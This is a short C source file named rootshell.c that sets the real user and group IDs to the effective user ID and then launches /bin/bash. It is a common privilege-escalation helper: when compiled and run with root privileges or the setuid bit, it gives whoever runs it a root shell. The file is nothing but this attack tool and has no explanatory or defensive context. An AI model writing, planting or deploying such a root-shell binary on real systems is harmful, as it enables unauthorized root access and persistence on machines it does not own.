//rootshell.c
#include <unistd.h>
int main() {
    setreuid(geteuid(),geteuid());
	setregid(geteuid(),geteuid());
	execv("/bin/bash",0);
}